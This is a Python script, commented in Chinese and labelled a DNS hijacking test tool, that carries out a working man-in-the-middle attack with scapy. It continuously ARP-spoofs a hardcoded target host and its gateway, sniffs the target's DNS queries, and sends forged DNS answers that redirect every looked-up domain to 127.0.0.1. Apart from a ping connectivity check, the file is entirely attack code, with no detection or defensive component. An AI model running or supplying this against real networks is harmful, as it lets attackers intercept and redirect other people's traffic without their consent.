#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
简单DNS劫持测试工具
快速验证DNS劫持是否生效
"""

import socket
import time
import threading
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR

class SimpleDNSTest:
    def __init__(self):
        self.target_ip = "10.30.77.103"
        self.gateway_ip = "10.30.255.254"
        self.redirect_ip = "127.0.0.1"  # 重定向到本地
        self.is_running = False
        
    def test_connectivity(self):
        """测试网络连通性"""
        print("🔍 网络连通性测试:")
        
        # 测试目标设备
        result = os.system(f"ping -n 2 {self.target_ip}")
        if result == 0:
            print("✅ 目标设备可达")
        else:
            print("❌ 目标设备不可达")
            return False
        
        # 测试网关
        result = os.system(f"ping -n 2 {self.gateway_ip}")
        if result == 0:
            print("✅ 网关设备可达")
        else:
            print("❌ 网关设备不可达")
        
        return True
    
    def simple_arp_spoof(self):
        """简单ARP欺骗"""
        print("🔧 启动ARP欺骗...")
        
        def spoof():
            while self.is_running:
                try:
                    # 欺骗目标
                    send(ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip), verbose=False)
                    # 欺骗网关
                    send(ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip), verbose=False)
                    time.sleep(2)
                except Exception as e:
                    print(f"ARP错误: {e}")
        
        t = threading.Thread(target=spoof)
        t.daemon = True
        t.start()
    
    def dns_sniffer(self):
        """DNS嗅探器"""
        print("📡 启动DNS嗅探...")
        
        def packet_handler(pkt):
            if pkt.haslayer(DNS) and pkt.haslayer(IP):
                dns = pkt[DNS]
                if dns.qr == 0:  # DNS查询
                    query = dns.qd.qname.decode().rstrip('.')
                    src_ip = pkt[IP].src
                    
                    if src_ip == self.target_ip:
                        print(f"📱 目标查询: {query}")
                        
                        # 发送欺骗响应
                        self.send_spoofed_response(pkt, query)
        
        sniff(filter="udp port 53", prn=packet_handler, store=0)
    
    def send_spoofed_response(self, pkt, domain):
        """发送欺骗DNS响应"""
        try:
            spoofed = (
                IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /
                DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(
                        rrname=domain + ".",
                        type="A",
                        ttl=300,
                        rdata=self.redirect_ip
                    )
                )
            )
            
            send(spoofed, verbose=False)
            print(f"✅ 已劫持: {domain} -> {self.redirect_ip}")
            
        except Exception as e:
            print(f"❌ 劫持失败: {e}")
    
    def start_test(self):
        """开始测试"""
        print("🚀 开始DNS劫持测试")
        
        # 测试连通性
        if not self.test_connectivity():
            print("❌ 网络连通性测试失败，请检查网络")
            return
        
        self.is_running = True
        
        # 启动ARP欺骗
        self.simple_arp_spoof()
        
        # 启动DNS嗅探
        try:
            self.dns_sniffer()
        except KeyboardInterrupt:
            print("\n⏹️ 测试结束")
        except Exception as e:
            print(f"❌ 测试错误: {e}")
        finally:
            self.is_running = False

def main():
    """主函数"""
    print("=" * 50)
    print("     简单DNS劫持测试工具")
    print("=" * 50)
    
    # 检查权限
    try:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("⚠️  建议以管理员权限运行")
    except:
        pass
    
    test = SimpleDNSTest()
    
    print("\n📋 测试配置:")
    print(f"   目标IP: {test.target_ip}")
    print(f"   网关IP: {test.gateway_ip}")
    print(f"   重定向IP: {test.redirect_ip}")
    
    input("\n按Enter键开始测试...")
    
    test.start_test()

if __name__ == "__main__":
    main()